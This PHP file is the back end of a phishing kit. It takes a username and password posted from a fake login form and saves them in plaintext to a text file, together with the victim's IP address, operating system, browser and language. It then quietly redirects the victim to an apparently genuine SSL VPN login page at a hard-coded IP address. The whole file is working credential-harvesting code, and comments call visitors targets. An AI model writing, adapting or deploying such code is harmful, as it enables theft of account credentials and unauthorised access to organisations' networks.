<?php
	
	error_reporting(0);
	header("Content-type: text/html; charset=utf-8");
	if (!isset($_POST['username']) || !isset($_POST['password'])){
		header("HTTP/1.1 404 Not Found");
		exit;
	}
	
	$url="http://ip-api.com/json/?lang=zh-CN"; 
	$UserAgent = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36';  
	$curl = curl_init(); 
	curl_setopt($curl, CURLOPT_URL, $url); 
	curl_setopt($curl, CURLOPT_HEADER, 0);  
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);  
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);  
	curl_setopt($curl, CURLOPT_ENCODING, '');  
	curl_setopt($curl, CURLOPT_USERAGENT, $UserAgent);  
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);  
	$data = curl_exec($curl);
	$data = json_decode($data, true);
	$country = $data['country']; 
	$region = $data['regionName']; 
	$city = $data['city'];
	$ip = $data['query'];
	
	$filename = 'OpenCacksr.txt';
	file_put_contents($filename,"\n------------------------------------------------------------------------------", FILE_APPEND);
	file_put_contents($filename,"\n登录时间 : ".date("Y-m-d H:i:s"), FILE_APPEND);
	//file_put_contents($filename,"\n出口 IP  : ".$ip, FILE_APPEND);
	file_put_contents($filename,"\n真实 IP  : ".get_inter(), FILE_APPEND);
	file_put_contents($filename,"\n登录账号 : ".$_POST['username'], FILE_APPEND);
	file_put_contents($filename,"\n登录密码 : ".$_POST['password'], FILE_APPEND);
	file_put_contents($filename,"\n操作系统 : ".get_os(), FILE_APPEND);
	file_put_contents($filename,"\n浏览器   : ".get_user_browser(), FILE_APPEND);
	file_put_contents($filename,"\n语言环境 : ".GetLang(), FILE_APPEND);
	//file_put_contents($filename,"\n物理位置 : "."来自".$country."-".$region."-".$city, FILE_APPEND);
	file_put_contents($filename,"\n------------------------------------------------------------------------------\n", FILE_APPEND);
	header('Location:https://60.29.184.13/por/login_psw.csp');
	
	//真实ip
	function get_inter()
    {
        $onlineip = '';
        if (getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
            $onlineip = getenv('HTTP_CLIENT_IP');
        } elseif (getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
            $onlineip = getenv('HTTP_X_FORWARDED_FOR');
        } elseif (getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
            $onlineip = getenv('REMOTE_ADDR');
        } elseif (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
            $onlineip = $_SERVER['REMOTE_ADDR'];
        }
        return $onlineip;
    }
	
	//浏览器种类
	function get_user_browser() {
		static $browser;
		if (isset($browser)) {
			return $browser;
		}
		$u_agent = $_SERVER['HTTP_USER_AGENT'];
		$bname = '未知浏览器';
		$version = "";

		if (preg_match('/MSIE/i', $u_agent) && !preg_match('/Opera/i', $u_agent)) {
			$bname = 'IE';
			$ub = "MSIE";
		} elseif (preg_match('/Edge/i', $u_agent)) {
			$bname = 'Edge';
			$ub = 'Edge';
		} elseif (preg_match('/Trident\/7.*like Gecko/i', $u_agent)) {
			$bname = 'IE';
			$ub = "rv";
		} elseif (preg_match('/Firefox/i', $u_agent)) {
			$bname = 'Firefox';
			$ub = "Firefox";
		} elseif (preg_match('/Chrome/i', $u_agent)) {
			$bname = 'Chrome';
			$ub = "Chrome";
		} elseif (preg_match('/Safari/i', $u_agent)) {
			$bname = 'Safari';
			$ub = "Safari";
		} elseif (preg_match('/Opera/i', $u_agent)) {
			$bname = 'Opera';
			$ub = "Opera";
		} elseif (preg_match('/Netscape/i', $u_agent)) {
			$bname = 'Netscape';
			$ub = "Netscape";
		}

		$known = array('Version', $ub, 'other');
		$pattern = '#(?<browser>' . join('|', $known) . ')[/: ]+(?<version>[0-9.|a-zA-Z.]*)#';
		if (!preg_match_all($pattern, $u_agent, $matches)) {
		}
		$i = count($matches['browser']);
		if ($i != 1) {
			if (strripos($u_agent, "Version") < strripos($u_agent, $ub)) {
				$version = $matches['version'][0];
			} else {
				$version = $matches['version'][1];
			}
		} else {
			$version = $matches['version'][0];
		}

		if ($version == null || $version == "") {$version = "";}
		$browser = $bname . ' ' . $version;
		return $browser;
	}
	
	// 目标机器语言环境
	function GetLang(){
	   if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
		$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
		$lang = substr($lang,0,5);
		if(preg_match("/zh-cn/i",$lang)){
			$lang = "简体中文[大陆]";
		}elseif(preg_match("/zh-HK/i",$lang)){
			$lang = "繁体中文[香港]";
		}elseif(preg_match("/zh-TW/i",$lang)){
			$lang = "繁体中文[香港]";
		}elseif(preg_match("/en-US/i",$lang)){
			$lang = "英文[美国]";
		}elseif(preg_match("/en-GB/i",$lang)){
			$lang = "英文[英国]";
		}elseif(preg_match("/ja-JP/i",$lang)){
			$lang = "日文";
		}elseif(preg_match("/ko-KR/i",$lang)){
			$lang = "韩文";
		}else{
			$lang = "未知语言";
		}
		return $lang;
		
	   }else{return "获取语言环境失败";}
	}
	
	// 目标操作系统类别版本及位数
	function get_os(){  
		$agent = $_SERVER['HTTP_USER_AGENT'];  
		$os = false;  
		if (preg_match('/Windows/i', $agent) && preg_match('/NT 6.0/i', $agent))  
		{
			if  (preg_match('/Win64/i', $agent) || preg_match('/WOW64/i', $agent))
			{
				$os = 'Windows Vista 64位';  
			}else{
				$os = 'Windows Vista 32位';   
			}
		}  
		else if (preg_match('/Windows/i', $agent) && preg_match('/NT 6.1/i', $agent))  
		{
			if  (preg_match('/Win64/i', $agent) || preg_match('/WOW64/i', $agent))
			{
				$os = 'Windows 7 64位';
			}else{
				$os = 'Windows 7 32位';  
			}
		}  
		else if (preg_match('/Windows/i', $agent) && preg_match('/NT 6.2/i', $agent))  
		{
			if  (preg_match('/Win64/i', $agent) || preg_match('/WOW64/i', $agent))
			{
				$os = 'Windows 8 64位'; 
			}else{
				$os = 'Windows 8 32位';   
			}
		}
		else if (preg_match('/Windows/i', $agent) && preg_match('/NT 6.3/i', $agent))  
		{
			if  (preg_match('/Win64/i', $agent) || preg_match('/WOW64/i', $agent))
			{
				 $os = 'Windows 8.1 64位'; 
			}else{
				 $os = 'Windows 8.1 32位';   
			}
		}
		else if(preg_match('/Windows/i', $agent) && preg_match('/NT 10.0/i', $agent))  
		{
			if  (preg_match('/Win64/i', $agent) || preg_match('/WOW64/i', $agent))
			{
				 $os = 'Windows 10 64位'; 
			}else{
				 $os = 'Windows 10 32位';  
			}
		}
		else if (preg_match('/Windows/i', $agent) && preg_match('/NT 5.2/i', $agent))  
		{
		  $os = 'Windows 2003 32位';  
		}
		else if (preg_match('/Windows/i', $agent) && preg_match('/NT 5.1/i', $agent))  
		{
		  $os = 'Windows XP 32位';  
		} 
		else if (preg_match('/linux/i', $agent))  
		{
		  $os = 'Linux';  
				if ( preg_match( '/Android.([0-9. _]+)/i', $agent, $matches ) ) {
				$os = 'Android';
			} elseif ( preg_match( '#Ubuntu#i', $agent ) ) {
				$os = 'Ubuntu';
			} elseif ( preg_match( '#Debian#i', $agent ) ) {
				$os = 'Debian';
			} elseif ( preg_match( '#Fedora#i', $agent ) ) {
				$os = 'Fedora';
			}
		}  
		else if (preg_match('/unix/i', $agent))  
		{
		  $os = 'Unix';  
		}  
		else if (preg_match('/sun/i', $agent) && preg_match('/os/i', $agent))  
		{  
		  $os = 'SunOS';  
		}  
		else if (preg_match('/ibm/i', $agent) && preg_match('/os/i', $agent))  
		{  
		  $os = 'IBM OS/2';  
		}  
		else if (preg_match('/Mac/i', $agent) && preg_match('/PC/i', $agent))  
		{  
		  $os = 'Macintosh';  
		}  
		else if (preg_match('/PowerPC/i', $agent))  
		{  
		  $os = 'PowerPC';  
		}  
		else if (preg_match('/AIX/i', $agent))  
		{  
		  $os = 'AIX';  
		}  
		else if (preg_match('/HPUX/i', $agent))  
		{  
		  $os = 'HPUX';  
		}  
		else if (preg_match('/NetBSD/i', $agent))  
		{  
		  $os = 'NetBSD';  
		}  
		else if (preg_match('/BSD/i', $agent))  
		{  
		  $os = 'BSD';  
		}  
		else if (preg_match('/OSF1/i', $agent))  
		{  
		  $os = 'OSF1';  
		}  
		else if (preg_match('/IRIX/i', $agent))  
		{  
		  $os = 'IRIX';  
		}  
		else if (preg_match('/FreeBSD/i', $agent))  
		{  
		  $os = 'FreeBSD';  
		}  
		else if (preg_match('/teleport/i', $agent))  
		{  
		  $os = 'teleport';  
		}  
		else if (preg_match('/flashget/i', $agent))  
		{  
		  $os = 'flashget';  
		}  
		else if (preg_match('/webzip/i', $agent))  
		{  
		  $os = 'webzip';  
		}  
		else if (preg_match('/offline/i', $agent))  
		{  
		  $os = 'offline';  
		}  
		else  
		{  
		  $os = '未知操作系统';  
		}  
		return $os;    
	}
	
?>